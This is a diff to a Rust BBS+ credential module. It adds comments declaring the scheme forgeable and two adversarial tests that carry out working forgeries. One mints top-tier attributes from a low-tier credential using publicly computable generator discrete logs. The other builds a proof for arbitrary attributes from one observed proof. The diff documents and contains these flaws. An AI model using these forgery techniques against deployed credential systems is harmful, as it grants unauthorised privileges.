@@ -45,6 +45,24 @@
 /// Uses BLS12-381 curve. The implementation is self-contained using the
 /// `bls12_381` crate for group operations, avoiding external BBS+ libraries
 /// that may have unstable APIs.
+///
+/// # BROKEN — do not use for trust decisions
+///
+/// This scheme is forgeable in two independent ways, both demonstrated by
+/// forgery tests at the bottom of this file:
+///
+/// 1. `generators()` returns base-point multiples of publicly derivable
+///    scalars rather than hash-to-curve outputs, so the discrete logs BBS+
+///    unforgeability depends on being unknown are public. One issued
+///    credential is enough to mint any attribute set without the issuer key.
+/// 2. The verifier's pairing check and its Schnorr check are never related to
+///    each other, so the proved messages are not bound to the signature.
+///    Observing one proof — they travel in descriptors — is enough to mint
+///    proofs for arbitrary attributes with no credential at all.
+///
+/// `descriptor.bbs_tier()` is consequently NOT read into `AdmissionSignals`.
+/// See `docs/adr/006-bbs-plus-known-breaks.md` for the analysis, the
+/// containment currently in place, and the conditions for re-enabling.
 use bls12_381::{
     multi_miller_loop, G1Affine, G1Projective, G2Affine, G2Prepared, G2Projective, Scalar,
 };
@@ -71,8 +89,20 @@ const TOTAL_GENERATORS: usize = NUM_MESSAGES + 2;
 
 /// Deterministic generators for BBS+ (g1, h0, h1..h4).
 ///
-/// Derived by hashing domain-separated indices to G1. This avoids a trusted
-/// setup and ensures all implementations agree on the generators.
+/// # BROKEN — these are not independent generators
+///
+/// This computes `G1::generator() * hash_to_scalar(..)`, i.e. a scalar multiple
+/// of the base point. It does **not** hash to the curve, so each generator's
+/// discrete log with respect to the base point is publicly computable, and the
+/// unknown-discrete-log assumption BBS+ unforgeability rests on does not hold.
+/// The doc comment here previously claimed "hashing domain-separated indices to
+/// G1", which is what hid this: the description was of hash-to-curve, the code
+/// was a scalar multiplication.
+///
+/// The fix is RFC 9380 hash-to-curve (`bls12_381` provides SSWU behind its
+/// `experimental` feature) under a fixed DST. That changes every generator and
+/// therefore invalidates existing credentials, so it is a wire-format break.
+/// See `docs/adr/006-bbs-plus-known-breaks.md`.
 fn generators() -> Vec<G1Projective> {
     let mut gens = Vec::with_capacity(TOTAL_GENERATORS);
     for i in 0..TOTAL_GENERATORS {
@@ -799,6 +829,222 @@ mod tests {
             epoch: 1000,
             nonce: 42,
         }
+    }
+
+    // ── Adversarial: forgery attempts ───────────────────────────────────
+    //
+    // Every other test in this module has an honest prover build a proof and
+    // then damages it. That only ever exercises the implementation against
+    // itself. These two build a proof the way an attacker would -- from the
+    // values an attacker can actually obtain -- and are the only tests here
+    // that can fail for a reason of *construction* rather than of encoding.
+
+    /// Recompute each generator's discrete log with respect to the G1 base
+    /// point, using only public values.
+    ///
+    /// `generators()` documents itself as "hashing domain-separated indices to
+    /// G1", but computes `G1::generator() * hash_to_scalar(..)` instead. That
+    /// is a scalar multiple of the base point, not a hash-to-curve, so every
+    /// `t_i` below is computable by anyone.
+    fn public_generator_dlogs() -> Vec<Scalar> {
+        (0..TOTAL_GENERATORS)
+            .map(|i| {
+                let mut input = Vec::new();
+                input.extend_from_slice(b"miasma-bbs-gen-v1-");
+                input.extend_from_slice(&(i as u32).to_le_bytes());
+                hash_to_scalar(blake3::hash(&input).as_bytes())
+            })
+            .collect()
+    }
+
+    /// BBS+ unforgeability requires the generators to have unknown discrete-log
+    /// relationships. They do not, so one issued credential is enough to mint a
+    /// signature over attributes the issuer never saw -- without the issuer key.
+    #[test]
+    fn known_generator_dlogs_allow_attribute_forgery_without_the_issuer_key() {
+        let issuer_key = BbsIssuerKey::generate();
+        let gv = generators();
+        let t = public_generator_dlogs();
+
+        // The generators really are base-point multiples of publicly derivable
+        // scalars. If this ever stops holding, the forgery below stops working.
+        for i in 0..TOTAL_GENERATORS {
+            assert_eq!(
+                G1Affine::from(gv[i]),
+                G1Affine::from(G1Projective::generator() * t[i]),
+                "generator {i} is a known multiple of the base point"
+            );
+        }
+
+        // A legitimately issued, lowest-privilege credential.
+        let honest = BbsCredentialAttributes {
+            tier: CredentialTier::Observed,
+            capabilities: 0x01,
+            ..test_attributes()
+        };
+        let honest_messages = honest.to_messages();
+        let sig = BbsSignature::sign(&issuer_key, &honest_messages);
+        let s = deserialize_scalar(&sig.s);
+        let e = deserialize_scalar(&sig.e);
+
+        // Because h_i = t_i * g, the whole commitment collapses to one scalar:
+        //   B = g * (t0 + s*t1 + sum(m_i * t_{i+2}))
+        let aggregate = |m: &[Scalar; NUM_MESSAGES], s: Scalar| {
+            let mut acc = t[0] + s * t[1];
+            for i in 0..NUM_MESSAGES {
+                acc += m[i] * t[i + 2];
+            }
+            acc
+        };
+
+        // Attributes the issuer never signed: top tier, every capability, and
+        // a link secret of the attacker's own choosing (so the credential is
+        // freely transferable, which the link secret is supposed to prevent).
+        let forged_attrs = BbsCredentialAttributes {
+            link_secret: [0x9u8; 32],
+            tier: CredentialTier::Endorsed,
+            capabilities: 0xFF,
+            epoch: honest.epoch,
+            nonce: honest.nonce,
+        };
+        let forged_messages = forged_attrs.to_messages();
+
+        // Solve for the blinding factor that keeps the aggregate unchanged.
+        let mut wanted = aggregate(&honest_messages, s) - t[0];
+        for i in 0..NUM_MESSAGES {
+            wanted -= forged_messages[i] * t[i + 2];
+        }
+        let s_forged = wanted * t[1].invert().unwrap();
+
+        // (A, e, s_forged) satisfies the real BBS+ verification equation
+        //   e(A, pk + e*G2) == e(B', G2)
+        // for the *forged* message vector. Nothing was re-signed.
+        let a = deserialize_g1(&sig.a);
+        let mut b_forged = gv[0] + gv[1] * s_forged;
+        for i in 0..NUM_MESSAGES {
+            b_forged += gv[i + 2] * forged_messages[i];
+        }
+        let pairing = multi_miller_loop(&[
+            (
+                &G1Affine::from(a),
+                &G2Prepared::from(G2Affine::from(
+                    issuer_key.pk + G2Projective::generator() * e,
+                )),
+            ),
+            (
+                &G1Affine::from(-b_forged),
+                &G2Prepared::from(G2Affine::generator()),
+            ),
+        ])
+        .final_exponentiation();
+        assert_eq!(
+            pairing,
+            bls12_381::Gt::identity(),
+            "forged signature satisfies the BBS+ signature equation"
+        );
+
+        // And it survives the real prove/verify path end to end.
+        let forged_credential = BbsCredential {
+            attributes: forged_attrs,
+            signature: BbsSignature {
+                a: sig.a.clone(),
+                e: sig.e.clone(),
+                s: s_forged.to_bytes()[..32].to_vec(),
+            },
+            issuer_pk: issuer_key.pk_bytes().to_vec(),
+        };
+        let proof = bbs_create_proof(&forged_credential, &DisclosurePolicy::default(), b"ctx");
+        let disclosed = bbs_verify_proof(&proof, &issuer_key.pk_bytes(), b"ctx")
+            .expect("verifier accepts the forged credential");
+        assert_eq!(disclosed, vec![(1, CredentialTier::Endorsed as u64)]);
+    }
+
+    /// The verifier runs two independent checks: a Schnorr proof over the
+    /// prover-supplied commitment `b_point`, and a pairing check over
+    /// `a_prime`/`a_bar`. Nothing ties the two together, so the messages proved
+    /// are never bound to the signature. Observing one proof -- they travel in
+    /// descriptors -- is enough to mint proofs for arbitrary attributes.
+    #[test]
+    fn pairing_check_is_not_bound_to_the_message_commitment() {
+        let issuer_key = BbsIssuerKey::generate();
+        let issuer_pk = issuer_key.pk_bytes();
+        let context = b"admission-ctx";
+
+        // A victim publishes an ordinary proof.
+        let victim = BbsCredentialAttributes {
+            tier: CredentialTier::Observed,
+            capabilities: 0x01,
+            ..test_attributes()
+        };
+        let victim_cred = BbsCredential {
+            attributes: victim.clone(),
+            signature: BbsSignature::sign(&issuer_key, &victim.to_messages()),
+            issuer_pk: issuer_pk.to_vec(),
+        };
+        let observed = bbs_create_proof(&victim_cred, &DisclosurePolicy::default(), context);
+
+        // ── attacker: holds no credential and no issuer key, only `observed`.
+        //
+        // e(A', W) == e(A_bar, G2) is preserved under scaling both points by
+        // the same r, so a fresh-looking pair is free.
+        let r = Scalar::random(&mut rand::thread_rng());
+        let a_prime = parse_g1_proof(&observed.a_prime).unwrap() * r;
+        let a_bar = parse_g1_proof(&observed.a_bar).unwrap() * r;
+
+        // Build a commitment over whatever attributes we want. We know all of
+        // its openings because we chose them, so the Schnorr half is honest.
+        let gv = generators();
+        let forged_attrs = BbsCredentialAttributes {
+            link_secret: [0x5u8; 32],
+            tier: CredentialTier::Endorsed,
+            capabilities: 0xFF,
+            epoch: 7777,
+            nonce: 1,
+        };
+        let m = forged_attrs.to_messages();
+        let s = Scalar::random(&mut rand::thread_rng());
+        let mut b_point = gv[0] + gv[1] * s;
+        for i in 0..NUM_MESSAGES {
+            b_point += gv[i + 2] * m[i];
+        }
+
+        let hidden: Vec<usize> = (0..NUM_MESSAGES).filter(|i| *i != 1).collect();
+        let blind_s = Scalar::random(&mut rand::thread_rng());
+        let blindings: Vec<Scalar> = hidden
+            .iter()
+            .map(|_| Scalar::random(&mut rand::thread_rng()))
+            .collect();
+        let mut t_commit = gv[1] * blind_s;
+        for (j, &idx) in hidden.iter().enumerate() {
+            t_commit += gv[idx + 2] * blindings[j];
+        }
+
+        let mut challenge_input = Vec::new();
+        challenge_input.extend_from_slice(&G1Affine::from(a_prime).to_compressed());
+        challenge_input.extend_from_slice(&G1Affine::from(a_bar).to_compressed());
+        challenge_input.extend_from_slice(&G1Affine::from(b_point).to_compressed());
+        challenge_input.extend_from_slice(&G1Affine::from(t_commit).to_compressed());
+        challenge_input.extend_from_slice(context);
+        let challenge = hash_to_scalar(&[DOMAIN_BBS_CHALLENGE, &challenge_input].concat());
+
+        let forged = BbsProof {
+            a_prime: G1Affine::from(a_prime).to_compressed().to_vec(),
+            a_bar: G1Affine::from(a_bar).to_compressed().to_vec(),
+            b_point: G1Affine::from(b_point).to_compressed().to_vec(),
+            challenge: challenge.to_bytes()[..32].to_vec(),
+            response_s: (blind_s + challenge * s).to_bytes()[..32].to_vec(),
+            responses: hidden
+                .iter()
+                .enumerate()
+                .map(|(j, &idx)| (blindings[j] + challenge * m[idx]).to_bytes()[..32].to_vec())
+                .collect(),
+            disclosed: vec![(1, CredentialTier::Endorsed as u64)],
+            domain: context.to_vec(),
+        };
+
+        let disclosed = bbs_verify_proof(&forged, &issuer_pk, context)
+            .expect("verifier accepts a proof minted from an observed one");
+        assert_eq!(disclosed, vec![(1, CredentialTier::Endorsed as u64)]);
     }
 
     #[test]
